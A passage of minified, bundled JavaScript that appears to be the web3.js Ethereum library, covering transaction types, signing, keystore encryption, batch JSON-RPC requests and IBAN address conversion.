              , s = this.maxFeePerGas - e
              , l = (n < s ? n : s) + e;
            return this.gasLimit * l + this.value
        }
        raw() {
            return [Fe(this.chainId), Fe(this.nonce), Fe(this.maxPriorityFeePerGas), Fe(this.maxFeePerGas), Fe(this.gasLimit), this.to !== void 0 ? this.to.buf : Uint8Array.from([]), Fe(this.value), this.data, this.accessList, this.v !== void 0 ? Fe(this.v) : Uint8Array.from([]), this.r !== void 0 ? Fe(this.r) : Uint8Array.from([]), this.s !== void 0 ? Fe(this.s) : Uint8Array.from([])]
        }
        serialize() {
            const e = this.raw();
            return nn(zm, Fn.RLP.encode(e))
        }
        getMessageToSign(e=!0) {
            const n = this.raw().slice(0, 9)
              , s = nn(zm, Fn.RLP.encode(n));
            return e ? Jt(s) : s
        }
        hash() {
            if (!this.isSigned()) {
                const e = this._errorMsg("Cannot call hash method if transaction is not signed");
                throw new Error(e)
            }
            return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = Jt(this.serialize())),
            this.cache.hash) : Jt(this.serialize())
        }
        getMessageToVerifySignature() {
            return this.getMessageToSign()
        }
        getSenderPublicKey() {
            if (!this.isSigned()) {
                const l = this._errorMsg("Cannot call this method if transaction is not signed");
                throw new Error(l)
            }
            const e = this.getMessageToVerifySignature()
              , {v: n, r: s, s: o} = this;
            this._validateHighS();
            try {
                return A0(e, n + BigInt(27), Fe(s), Fe(o))
            } catch {
                const u = this._errorMsg("Invalid Signature");
                throw new Error(u)
            }
        }
        _processSignature(e, n, s) {
            const o = Object.assign(Object.assign({}, this.txOptions), {
                common: this.common
            });
            return ys.fromTxData({
                chainId: this.chainId,
                nonce: this.nonce,
                maxPriorityFeePerGas: this.maxPriorityFeePerGas,
                maxFeePerGas: this.maxFeePerGas,
                gasLimit: this.gasLimit,
                to: this.to,
                value: this.value,
                data: this.data,
                accessList: this.accessList,
                v: e - BigInt(27),
                r: rt(n),
                s: rt(s)
            }, o)
        }
        toJSON() {
            const e = Fw(this.accessList);
            return {
                chainId: mt(this.chainId),
                nonce: mt(this.nonce),
                maxPriorityFeePerGas: mt(this.maxPriorityFeePerGas),
                maxFeePerGas: mt(this.maxFeePerGas),
                gasLimit: mt(this.gasLimit),
                to: this.to !== void 0 ? this.to.toString() : void 0,
                value: mt(this.value),
                data: je(this.data),
                accessList: e,
                v: this.v !== void 0 ? mt(this.v) : void 0,
                r: this.r !== void 0 ? mt(this.r) : void 0,
                s: this.s !== void 0 ? mt(this.s) : void 0
            }
        }
        errorStr() {
            let e = this._getSharedErrorPostfix();
            return e += ` maxFeePerGas=${this.maxFeePerGas} maxPriorityFeePerGas=${this.maxPriorityFeePerGas}`,
            e
        }
        _errorMsg(e) {
            return `${e} (${this.errorStr()})`
        }
    }
    const gp = 1
      , Gm = lt(gp.toString(16).padStart(2, "0"));
    class vs extends to {
        static fromTxData(e, n={}) {
            return new vs(e,n)
        }
        static fromSerializedTx(e, n={}) {
            if (!Gd(e.subarray(0, 1), Gm))
                throw new Error(`Invalid serialized tx input: not an EIP-2930 transaction (wrong tx type, expected: ${gp}, received: ${je(e.subarray(0, 1))}`);
            const s = Fn.RLP.decode(Uint8Array.from(e.subarray(1)));
            if (!Array.isArray(s))
                throw new Error("Invalid serialized tx input: must be array");
            return vs.fromValuesArray(s, n)
        }
        static fromValuesArray(e, n={}) {
            if (e.length !== 8 && e.length !== 11)
                throw new Error("Invalid EIP-2930 transaction. Only expecting 8 values (for unsigned tx) or 11 values (for signed tx).");
            const [s,o,l,u,d,p,h,m,y,w,E] = e;
            this._validateNotArray({
                chainId: s,
                v: y
            }),
            $p({
                nonce: o,
                gasPrice: l,
                gasLimit: u,
                value: p,
                v: y,
                r: w,
                s: E
            });
            const S = [];
            return new vs({
                chainId: rt(s),
                nonce: o,
                gasPrice: l,
                gasLimit: u,
                to: d,
                value: p,
                data: h,
                accessList: m ?? S,
                v: y !== void 0 ? rt(y) : void 0,
                r: w,
                s: E
            },n)
        }
        constructor(e, n={}) {
            var s;
            super(Object.assign(Object.assign({}, e), {
                type: gp
            }), n),
            this.DEFAULT_HARDFORK = "berlin";
            const {chainId: o, accessList: l, gasPrice: u} = e;
            if (this.common = this._getCommon(n.common, o),
            this.chainId = this.common.chainId(),
            !this.common.isActivatedEIP(2930))
                throw new Error("EIP-2930 not enabled on Common");
            this.activeCapabilities = this.activeCapabilities.concat([2718, 2930]);
            const d = Gw(l ?? []);
            if (this.accessList = d.accessList,
            this.AccessListJSON = d.AccessListJSON,
            qw(this.accessList),
            this.gasPrice = rt(ht(u === "" ? "0x" : u)),
            this._validateCannotExceedMaxInteger({
                gasPrice: this.gasPrice
            }),
            to._validateNotArray(e),
            this.gasPrice * this.gasLimit > Zl) {
                const h = this._errorMsg("gasLimit * gasPrice cannot exceed MAX_INTEGER");
                throw new Error(h)
            }
            this._validateYParity(),
            this._validateHighS(),
            ((s = n?.freeze) !== null && s !== void 0 ? s : !0) && Object.freeze(this)
        }
        getDataFee() {
            if (this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork())
                return this.cache.dataFee.value;
            let e = super.getDataFee();
            return e += BigInt(Qw(this.accessList, this.common)),
            Object.isFrozen(this) && (this.cache.dataFee = {
                value: e,
                hardfork: this.common.hardfork()
            }),
            e
        }
        getUpfrontCost() {
            return this.gasLimit * this.gasPrice + this.value
        }
        raw() {
            return [Fe(this.chainId), Fe(this.nonce), Fe(this.gasPrice), Fe(this.gasLimit), this.to !== void 0 ? this.to.buf : Uint8Array.from([]), Fe(this.value), this.data, this.accessList, this.v !== void 0 ? Fe(this.v) : Uint8Array.from([]), this.r !== void 0 ? Fe(this.r) : Uint8Array.from([]), this.s !== void 0 ? Fe(this.s) : Uint8Array.from([])]
        }
        serialize() {
            const e = this.raw();
            return nn(Gm, Fn.RLP.encode(e))
        }
        getMessageToSign(e=!0) {
            const n = this.raw().slice(0, 8)
              , s = nn(Gm, Fn.RLP.encode(n));
            return e ? Jt(s) : s
        }
        hash() {
            if (!this.isSigned()) {
                const e = this._errorMsg("Cannot call hash method if transaction is not signed");
                throw new Error(e)
            }
            return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = Jt(this.serialize())),
            this.cache.hash) : Jt(this.serialize())
        }
        getMessageToVerifySignature() {
            return this.getMessageToSign()
        }
        getSenderPublicKey() {
            if (!this.isSigned()) {
                const l = this._errorMsg("Cannot call this method if transaction is not signed");
                throw new Error(l)
            }
            const e = this.getMessageToVerifySignature()
              , {v: n, r: s, s: o} = this;
            this._validateHighS();
            try {
                return A0(e, n + BigInt(27), Fe(s), Fe(o))
            } catch {
                const u = this._errorMsg("Invalid Signature");
                throw new Error(u)
            }
        }
        _processSignature(e, n, s) {
            const o = Object.assign(Object.assign({}, this.txOptions), {
                common: this.common
            });
            return vs.fromTxData({
                chainId: this.chainId,
                nonce: this.nonce,
                gasPrice: this.gasPrice,
                gasLimit: this.gasLimit,
                to: this.to,
                value: this.value,
                data: this.data,
                accessList: this.accessList,
                v: e - BigInt(27),
                r: rt(n),
                s: rt(s)
            }, o)
        }
        toJSON() {
            const e = Fw(this.accessList);
            return {
                chainId: mt(this.chainId),
                nonce: mt(this.nonce),
                gasPrice: mt(this.gasPrice),
                gasLimit: mt(this.gasLimit),
                to: this.to !== void 0 ? this.to.toString() : void 0,
                value: mt(this.value),
                data: je(this.data),
                accessList: e,
                v: this.v !== void 0 ? mt(this.v) : void 0,
                r: this.r !== void 0 ? mt(this.r) : void 0,
                s: this.s !== void 0 ? mt(this.s) : void 0
            }
        }
        errorStr() {
            var e, n;
            let s = this._getSharedErrorPostfix();
            return s += ` gasPrice=${this.gasPrice} accessListCount=${(n = (e = this.accessList) === null || e === void 0 ? void 0 : e.length) !== null && n !== void 0 ? n : 0}`,
            s
        }
        _errorMsg(e) {
            return `${e} (${this.errorStr()})`
        }
    }
    const hk = 0;
    function jA(t, e) {
        const n = Number(t)
          , s = Number(e) * 2;
        return n === s + 35 || n === s + 36
    }
    class Lr extends to {
        static fromTxData(e, n={}) {
            return new Lr(e,n)
        }
        static fromSerializedTx(e, n={}) {
            const s = Fn.RLP.decode(e);
            if (!Array.isArray(s))
                throw new Error("Invalid serialized tx input. Must be array");
            return this.fromValuesArray(s, n)
        }
        static fromValuesArray(e, n={}) {
            if (e.length !== 6 && e.length !== 9)
                throw new Error("Invalid transaction. Only expecting 6 values (for unsigned tx) or 9 values (for signed tx).");
            const [s,o,l,u,d,p,h,m,y] = e;
            return $p({
                nonce: s,
                gasPrice: o,
                gasLimit: l,
                value: d,
                v: h,
                r: m,
                s: y
            }),
            new Lr({
                nonce: s,
                gasPrice: o,
                gasLimit: l,
                to: u,
                value: d,
                data: p,
                v: h,
                r: m,
                s: y
            },n)
        }
        constructor(e, n={}) {
            var s;
            if (super(Object.assign(Object.assign({}, e), {
                type: hk
            }), n),
            this.common = this._validateTxV(this.v, n.common),
            this.gasPrice = rt(ht(e.gasPrice === "" ? "0x" : e.gasPrice)),
            this.gasPrice * this.gasLimit > Zl) {
                const l = this._errorMsg("gas limit * gasPrice cannot exceed MAX_INTEGER (2^256-1)");
                throw new Error(l)
            }
            this._validateCannotExceedMaxInteger({
                gasPrice: this.gasPrice
            }),
            to._validateNotArray(e),
            this.common.gteHardfork("spuriousDragon") && (this.isSigned() ? jA(this.v, this.common.chainId()) && this.activeCapabilities.push(mi.EIP155ReplayProtection) : this.activeCapabilities.push(mi.EIP155ReplayProtection)),
            ((s = n?.freeze) !== null && s !== void 0 ? s : !0) && Object.freeze(this)
        }
        raw() {
            return [Fe(this.nonce), Fe(this.gasPrice), Fe(this.gasLimit), this.to !== void 0 ? this.to.buf : Uint8Array.from([]), Fe(this.value), this.data, this.v !== void 0 ? Fe(this.v) : Uint8Array.from([]), this.r !== void 0 ? Fe(this.r) : Uint8Array.from([]), this.s !== void 0 ? Fe(this.s) : Uint8Array.from([])]
        }
        serialize() {
            return Fn.RLP.encode(this.raw())
        }
        _getMessageToSign() {
            const e = [Fe(this.nonce), Fe(this.gasPrice), Fe(this.gasLimit), this.to !== void 0 ? this.to.buf : Uint8Array.from([]), Fe(this.value), this.data];
            return this.supports(mi.EIP155ReplayProtection) && (e.push(ht(this.common.chainId())),
            e.push(Ad(ht(0))),
            e.push(Ad(ht(0)))),
            e
        }
        getMessageToSign(e=!0) {
            const n = this._getMessageToSign();
            return e ? Jt(Fn.RLP.encode(n)) : n
        }
        getDataFee() {
            return this.cache.dataFee && this.cache.dataFee.hardfork === this.common.hardfork() ? this.cache.dataFee.value : (Object.isFrozen(this) && (this.cache.dataFee = {
                value: super.getDataFee(),
                hardfork: this.common.hardfork()
            }),
            super.getDataFee())
        }
        getUpfrontCost() {
            return this.gasLimit * this.gasPrice + this.value
        }
        hash() {
            if (!this.isSigned()) {
                const e = this._errorMsg("Cannot call hash method if transaction is not signed");
                throw new Error(e)
            }
            return Object.isFrozen(this) ? (this.cache.hash || (this.cache.hash = Jt(Fn.RLP.encode(this.raw()))),
            this.cache.hash) : Jt(Fn.RLP.encode(this.raw()))
        }
        getMessageToVerifySignature() {
            if (!this.isSigned()) {
                const n = this._errorMsg("This transaction is not signed");
                throw new Error(n)
            }
            const e = this._getMessageToSign();
            return Jt(Fn.RLP.encode(e))
        }
        getSenderPublicKey() {
            const e = this.getMessageToVerifySignature()
              , {v: n, r: s, s: o} = this;
            this._validateHighS();
            try {
                return A0(e, n, Fe(s), Fe(o), this.supports(mi.EIP155ReplayProtection) ? this.common.chainId() : void 0)
            } catch {
                const u = this._errorMsg("Invalid Signature");
                throw new Error(u)
            }
        }
        _processSignature(e, n, s) {
            let o = e;
            this.supports(mi.EIP155ReplayProtection) && (o += this.common.chainId() * BigInt(2) + BigInt(8));
            const l = Object.assign(Object.assign({}, this.txOptions), {
                common: this.common
            });
            return Lr.fromTxData({
                nonce: this.nonce,
                gasPrice: this.gasPrice,
                gasLimit: this.gasLimit,
                to: this.to,
                value: this.value,
                data: this.data,
                v: o,
                r: rt(n),
                s: rt(s)
            }, l)
        }
        toJSON() {
            return {
                nonce: mt(this.nonce),
                gasPrice: mt(this.gasPrice),
                gasLimit: mt(this.gasLimit),
                to: this.to !== void 0 ? this.to.toString() : void 0,
                value: mt(this.value),
                data: je(this.data),
                v: this.v !== void 0 ? mt(this.v) : void 0,
                r: this.r !== void 0 ? mt(this.r) : void 0,
                s: this.s !== void 0 ? mt(this.s) : void 0
            }
        }
        _validateTxV(e, n) {
            let s;
            const o = e !== void 0 ? Number(e) : void 0;
            if (o !== void 0 && o < 37 && o !== 27 && o !== 28)
                throw new Error(`Legacy txs need either v = 27/28 or v >= 37 (EIP-155 replay protection), got v = ${o}`);
            if (o !== void 0 && o !== 0 && (!n || n.gteHardfork("spuriousDragon")) && o !== 27 && o !== 28)
                if (n) {
                    if (!jA(BigInt(o), n.chainId()))
                        throw new Error(`Incompatible EIP155-based V ${o} and chain id ${n.chainId()}. See the Common parameter of the Transaction constructor to set the chain id.`)
                } else {
                    let l;
                    (o - 35) % 2 === 0 ? l = 35 : l = 36,
                    s = BigInt(o - l) / BigInt(2)
                }
            return this._getCommon(n, s)
        }
        errorStr() {
            let e = this._getSharedErrorPostfix();
            return e += ` gasPrice=${this.gasPrice}`,
            e
        }
        _errorMsg(e) {
            return `${e} (${this.errorStr()})`
        }
    }
    const qm = new Map;
    class Ds {
        constructor() {}
        static typeToInt(e) {
            return Number(rt(ht(e)))
        }
        static registerTransactionType(e, n) {
            const s = Ds.typeToInt(e);
            qm.set(s, n)
        }
        static fromTxData(e, n={}) {
            if (!("type"in e) || e.type === void 0)
                return Lr.fromTxData(e, n);
            const s = Ds.typeToInt(e.type);
            if (s === 0)
                return Lr.fromTxData(e, n);
            if (s === 1)
                return vs.fromTxData(e, n);
            if (s === 2)
                return ys.fromTxData(e, n);
            const o = qm.get(s);
            if (o?.fromTxData)
                return o.fromTxData(e, n);
            throw new Error(`Tx instantiation with type ${s} not supported`)
        }
        static fromSerializedData(e, n={}) {
            if (e[0] <= 127)
                switch (e[0]) {
                case 1:
                    return vs.fromSerializedTx(e, n);
                case 2:
                    return ys.fromSerializedTx(e, n);
                default:
                    {
                        const s = qm.get(Number(e[0]));
                        if (s?.fromSerializedTx)
                            return s.fromSerializedTx(e, n);
                        throw new Error(`TypedTransaction with ID ${e[0]} unknown`)
                    }
                }
            else
                return Lr.fromSerializedTx(e, n)
        }
        static fromBlockBodyData(e, n={}) {
            if (Qr(e))
                return this.fromSerializedData(e, n);
            if (Array.isArray(e))
                return Lr.fromValuesArray(e, n);
            throw new Error("Cannot decode transaction: unknown type input")
        }
    }
    var $d = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const lo = (t, e) => {
        let n;
        if (!e && typeof t == "string" && Ke(t) && t.length !== 66)
            throw new Xb;
        try {
            n = Qr(t) ? t : Ai(t)
        } catch {
            throw new DT
        }
        if (!e && n.byteLength !== 32)
            throw new Xb;
        return n
    }
      , w0 = (t, e=!1) => {
        const n = Ke(t) ? t : ii(t)
          , s = lt(n)
          , o = lt(ew(`Ethereum Signed Message:
${s.byteLength}`))
          , l = e ? s : nn(o, s);
        return Tn(l)
    }
      , mk = (t, e) => {
        const n = lo(e)
          , s = ar.sign(t.substring(2), n)
          , o = s.toCompactRawBytes()
          , l = s.r.toString(16).padStart(64, "0")
          , u = s.s.toString(16).padStart(64, "0")
          , d = s.recovery + 27;
        return {
            messageHash: t,
            v: kt(d),
            r: `0x${l}`,
            s: `0x${u}`,
            signature: `${je(o)}${d.toString(16)}`
        }
    }
      , Vw = (t, e) => {
        const n = w0(t)
          , {messageHash: s, v: o, r: l, s: u, signature: d} = mk(n, e);
        return {
            message: t,
            messageHash: s,
            v: o,
            r: l,
            s: u,
            signature: d
        }
    }
      , pk = (t, e) => $d(void 0, void 0, void 0, function*() {
        const n = t.sign(lt(e));
        if (q(n.v) || q(n.r) || q(n.s))
            throw new np("Signer Error");
        const s = n.validate(!0);
        if (s.length > 0) {
            let u = "Signer Error ";
            for (const d of s)
                u += `${u} ${d}.`;
            throw new np(u)
        }
        const o = je(n.serialize())
          , l = Tn(o);
        return {
            messageHash: je(n.getMessageToSign(!0)),
            v: `0x${n.v.toString(16)}`,
            r: `0x${n.r.toString(16).padStart(64, "0")}`,
            s: `0x${n.s.toString(16).padStart(64, "0")}`,
            rawTransaction: o,
            transactionHash: je(l)
        }
    })
      , gk = t => {
        if (q(t))
            throw new $T;
        const e = Ds.fromSerializedData(lt(t));
        return _i(e.getSenderAddress().toString())
    }
      , yp = (t, e, n, s, o) => {
        if (typeof t == "object") {
            const y = `${t.r}${t.s.slice(2)}${t.v.slice(2)}`;
            return yp(t.messageHash, y, n)
        }
        if (typeof e == "string" && typeof n == "string" && !q(s)) {
            const y = `${n}${s.slice(2)}${e.slice(2)}`;
            return yp(t, y, o)
        }
        if (q(e))
            throw new LT("signature string undefined");
        const l = 130
          , u = n ? t : w0(t);
        let d = parseInt(e.substring(l), 16);
        d > 26 && (d -= 27);
        const p = ar.Signature.fromCompact(e.slice(2, l)).addRecoveryBit(d).recoverPublicKey(u.replace("0x", "")).toRawBytes(!1)
          , h = Tn(p.subarray(1));
        return _i(`0x${h.slice(-40)}`)
    }
      , Wd = t => {
        const e = lo(t)
          , n = ar.getPublicKey(e, !1)
          , o = Tn(n.slice(1)).slice(-40);
        return _i(`0x${o}`)
    }
      , yk = (t, e) => {
        const n = lo(t);
        return `0x${je(ar.getPublicKey(n, e)).slice(4)}`
    }
      , Yw = (t, e, n) => $d(void 0, void 0, void 0, function*() {
        var s, o, l, u, d, p, h;
        const m = lo(t);
        let y;
        if (n?.salt ? y = typeof n.salt == "string" ? lt(n.salt) : n.salt : y = Ql(32),
        !(Xp(e) || Qr(e)))
            throw new PT;
        const w = typeof e == "string" ? lt(ii(e)) : e;
        let E;
        if (n?.iv) {
            if (E = typeof n.iv == "string" ? lt(n.iv) : n.iv,
            E.length !== 16)
                throw new HT
        } else
            E = Ql(16);
        const S = (s = n?.kdf) !== null && s !== void 0 ? s : "scrypt";
        let _, x;
        if (S === "pbkdf2") {
            if (x = {
                dklen: (o = n?.dklen) !== null && o !== void 0 ? o : 32,
                salt: je(y).replace("0x", ""),
                c: (l = n?.c) !== null && l !== void 0 ? l : 262144,
                prf: "hmac-sha256"
            },
            x.c < 1e3)
                throw new zT;
            _ = Bw(w, y, x.c, x.dklen, "sha256")
        } else if (S === "scrypt")
            x = {
                n: (u = n?.n) !== null && u !== void 0 ? u : 8192,
                r: (d = n?.r) !== null && d !== void 0 ? d : 8,
                p: (p = n?.p) !== null && p !== void 0 ? p : 1,
                dklen: (h = n?.dklen) !== null && h !== void 0 ? h : 32,
                salt: je(y).replace("0x", "")
            },
            _ = Cw(w, y, x.n, x.p, x.r, x.dklen);
        else
            throw new m1;
        const b = yield d0(m, _.slice(0, 16), E, "aes-128-ctr")
          , I = je(b).slice(2)
          , O = Tn(nn(_.slice(16, 32), b)).replace("0x", "");
        return {
            version: 3,
            id: a0(),
            address: Wd(m).toLowerCase().replace("0x", ""),
            crypto: {
                ciphertext: I,
                cipherparams: {
                    iv: je(E).replace("0x", "")
                },
                cipher: "aes-128-ctr",
                kdf: S,
                kdfparams: x,
                mac: O
            }
        }
    })
      , _0 = (t, e) => {
        const n = lo(t, e);
        return {
            address: Wd(n),
            privateKey: je(n),
            signTransaction: s => {
                throw new np("Do not have network access to sign the transaction")
            }
            ,
            sign: s => Vw(typeof s == "string" ? s : JSON.stringify(s), n),
            encrypt: (s, o) => $d(void 0, void 0, void 0, function*() {
                return Yw(n, s, o)
            })
        }
    }
      , vk = () => {
        const t = ar.utils.randomPrivateKey();
        return _0(`${je(t)}`)
    }
      , bk = (t, e, n) => $d(void 0, void 0, void 0, function*() {
        const s = typeof t == "object" ? t : JSON.parse(n ? t.toLowerCase() : t);
        if (Ae.validateJSONSchema(a3, s),
        s.version !== 3)
            throw new jT;
        const o = typeof e == "string" ? lt(ii(e)) : e;
        Ae.validate(["bytes"], [o]);
        let l;
        if (s.crypto.kdf === "scrypt") {
            const h = s.crypto.kdfparams
              , m = typeof h.salt == "string" ? lt(h.salt) : h.salt;
            l = Cw(o, m, h.n, h.p, h.r, h.dklen)
        } else if (s.crypto.kdf === "pbkdf2") {
            const h = s.crypto.kdfparams
              , m = typeof h.salt == "string" ? lt(h.salt) : h.salt;
            l = Bw(o, m, h.c, h.dklen, "sha256")
        } else
            throw new m1;
        const u = lt(s.crypto.ciphertext);
        if (Tn(nn(l.slice(16, 32), u)).replace("0x", "") !== s.crypto.mac)
            throw new UT;
        const p = yield hI(lt(s.crypto.ciphertext), l.slice(0, 16), lt(s.crypto.cipherparams.iv));
        return _0(p)
    });
    var PA = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const Ak = 1e3;
    class wk {
        constructor(e) {
            this._requestManager = e,
            this._requests = new Map
        }
        get requests() {
            return [...this._requests.values()].map(e => e.payload)
        }
        add(e) {
            const n = Os(e)
              , s = new pd;
            return this._requests.set(n.id, {
                payload: n,
                promise: s
            }),
            s
        }
        execute(e) {
            return PA(this, void 0, void 0, function*() {
                var n;
                if (this.requests.length === 0)
                    return Promise.resolve([]);
                const s = new pd({
                    timeout: (n = e?.timeout) !== null && n !== void 0 ? n : Ak,
                    eagerStart: !0,
                    timeoutMessage: "Batch request timeout"
                });
                return this._processBatchRequest(s).catch(o => s.reject(o)),
                s.catch(o => {
                    o instanceof p1 && this._abortAllRequests("Batch request timeout"),
                    s.reject(o)
                }
                ),
                s
            })
        }
        _processBatchRequest(e) {
            return PA(this, void 0, void 0, function*() {
                var n, s;
                const o = yield this._requestManager.sendBatch([...this._requests.values()].map(d => d.payload));
                if (o.length !== this._requests.size)
                    throw this._abortAllRequests("Invalid batch response"),
                    new hi(o,`Batch request size mismatch the results size. Requests: ${this._requests.size}, Responses: ${o.length}`);
                const l = this.requests.map(d => d.id).map(Number).sort( (d, p) => d - p)
                  , u = o.map(d => d.id).map(Number).sort( (d, p) => d - p);
                if (JSON.stringify(l) !== JSON.stringify(u))
                    throw this._abortAllRequests("Invalid batch response"),
                    new hi(o,`Batch request mismatch the results. Requests: [${l.join()}], Responses: [${u.join()}]`);
                for (const d of o)
                    Ur(d) ? (n = this._requests.get(d.id)) === null || n === void 0 || n.promise.resolve(d.result) : jr(d) && ((s = this._requests.get(d.id)) === null || s === void 0 || s.promise.reject(d.error));
                e.resolve(o)
            })
        }
        _abortAllRequests(e) {
            for (const {promise: n} of this._requests.values())
                n.reject(new ZT(e))
        }
    }
    var _k = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class mn extends sI {
        constructor(e) {
            var n;
            if (super(),
            this.providers = _s.providers,
            Ee(e) || typeof e == "string" && e.trim() !== "" || gd(e)) {
                this._requestManager = new _s(e),
                this._subscriptionManager = new yd(this._requestManager,{});
                return
            }
            const {config: s, provider: o, requestManager: l, subscriptionManager: u, registeredSubscriptions: d, accountProvider: p, wallet: h, requestManagerMiddleware: m} = e;
            this.setConfig(s ?? {}),
            this._requestManager = l ?? new _s(o,(n = s?.enableExperimentalFeatures) === null || n === void 0 ? void 0 : n.useSubscriptionWhenCheckingBlockTimeout,m),
            u ? this._subscriptionManager = u : this._subscriptionManager = new yd(this.requestManager,d ?? {}),
            p && (this._accountProvider = p),
            h && (this._wallet = h)
        }
        get requestManager() {
            return this._requestManager
        }
        get subscriptionManager() {
            return this._subscriptionManager
        }
        get wallet() {
            return this._wallet
        }
        get accountProvider() {
            return this._accountProvider
        }
        static fromContextObject(...e) {
            return new this(...e.reverse())
        }
        getContextObject() {
            var e;
            return {
                config: this.config,
                provider: this.provider,
                requestManager: this.requestManager,
                subscriptionManager: this.subscriptionManager,
                registeredSubscriptions: (e = this.subscriptionManager) === null || e === void 0 ? void 0 : e.registeredSubscriptions,
                providers: this.providers,
                wallet: this.wallet,
                accountProvider: this.accountProvider
            }
        }
        use(e, ...n) {
            const s = new e(...n,this.getContextObject());
            return this.on(Ns.CONFIG_CHANGE, o => {
                s.setConfig({
                    [o.name]: o.newValue
                })
            }
            ),
            this[e.name] = s,
            s
        }
        link(e) {
            this.setConfig(e.config),
            this._requestManager = e.requestManager,
            this.provider = e.provider,
            this._subscriptionManager = e.subscriptionManager,
            this._wallet = e.wallet,
            this._accountProvider = e._accountProvider,
            e.on(Ns.CONFIG_CHANGE, n => {
                this.setConfig({
                    [n.name]: n.newValue
                })
            }
            )
        }
        registerPlugin(e) {
            if (this[e.pluginNamespace] !== void 0)
                throw new KT(e.pluginNamespace);
            const n = {
                [e.pluginNamespace]: e
            };
            n[e.pluginNamespace].link(this),
            Object.assign(this, n)
        }
        get provider() {
            return this.currentProvider
        }
        set provider(e) {
            this.requestManager.setProvider(e)
        }
        get currentProvider() {
            return this.requestManager.provider
        }
        set currentProvider(e) {
            this.requestManager.setProvider(e)
        }
        get givenProvider() {
            return mn.givenProvider
        }
        setProvider(e) {
            return this.provider = e,
            !0
        }
        setRequestManagerMiddleware(e) {
            this.requestManager.setMiddleware(e)
        }
        get BatchRequest() {
            return wk.bind(void 0, this._requestManager)
        }
        extend(e) {
            var n;
            return e.property && !this[e.property] && (this[e.property] = {}),
            (n = e.methods) === null || n === void 0 || n.forEach(s => {
                const o = (...l) => _k(this, void 0, void 0, function*() {
                    return this.requestManager.send({
                        method: s.call,
                        params: l
                    })
                });
                e.property ? this[e.property][s.name] = o : this[s.name] = o
            }
            ),
            this
        }
    }
    mn.providers = _s.providers;
    class Rt {
        constructor(e) {
            if (this.toAddress = () => {
                if (this.isDirect()) {
                    const n = this._iban.slice(4)
                      , s = Rt._parseInt(n, 36)
                      , o = ql(s, 40);
                    return _i(o)
                }
                throw new Error("Iban is indirect and cannot be converted. Must be length of 34 or 35")
            }
            ,
            Rt.isIndirect(e) || Rt.isDirect(e))
                this._iban = e;
            else
                throw new Error("Invalid IBAN was provided")
        }
        static isDirect(e) {
            return e.length === 34 || e.length === 35
        }
        isDirect() {
            return Rt.isDirect(this._iban)
        }
        static isIndirect(e) {
            return e.length === 20
        }
        isIndirect() {
            return Rt.isIndirect(this._iban)
        }
        static isValid(e) {
            return /^XE[0-9]{2}(ETH[0-9A-Z]{13}|[0-9A-Z]{30,31})$/.test(e) && Rt._mod9710(Rt._iso13616Prepare(e)) === 1
        }
        isValid() {
            return Rt.isValid(this._iban)
        }
        static fromBban(e) {
            const n = "XE"
              , o = `0${(98 - this._mod9710(this._iso13616Prepare(`${n}00${e}`))).toString()}`.slice(-2);
            return new Rt(`${n}${o}${e}`)
        }
        static createIndirect(e) {
            return Rt.fromBban(`ETH${e.institution}${e.identifier}`)
        }
        static fromAddress(e) {
            if (!Sn(e))
                throw new qp(e);
            const s = BigInt(sc(e)).toString(36)
              , o = ql(s, 15);
            return Rt.fromBban(o.toUpperCase())
        }
        static toIban(e) {
            return Rt.fromAddress(e).toString()
        }
        client() {
            return this.isIndirect() ? this._iban.slice(11) : ""
        }
        checksum() {
            return this._iban.slice(2, 4)
        }
        institution() {
            return this.isIndirect() ? this._iban.slice(7, 11) : ""
        }
        toString() {
            return this._iban
        }
    }
    Rt._iso13616Prepare = t => {
        const s = t.toUpperCase();
        return `${s.slice(4)}${s.slice(0, 4)}`.split("").map(l => {
            const u = l.charCodeAt(0);
            return u >= 65 && u <= 90 ? u - 65 + 10 : l
        }
        ).join("")
    }
    ;
    Rt._parseInt = (t, e) => [...t].reduce( (n, s) => BigInt(parseInt(s, e)) + BigInt(e) * n, BigInt(0));
    Rt._mod9710 = t => {
        let e = t, n;
        for (; e.length > 2; )
            n = e.slice(0, 9),
            e = `${(parseInt(n, 10) % 97).toString()}${e.slice(n.length)}`;
        return parseInt(e, 10) % 97
    }
    ;
    Rt.toAddress = t => new Rt(t).toAddress();
    var Fm = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    }, Zw;
    class Kw extends Zd {
        constructor(e) {
            super(),
            this[Zw] = "Promise",
            this._promise = new Promise(e)
        }
        then(e, n) {
            return Fm(this, void 0, void 0, function*() {
                return this._promise.then(e, n)
            })
        }
        catch(e) {
            return Fm(this, void 0, void 0, function*() {
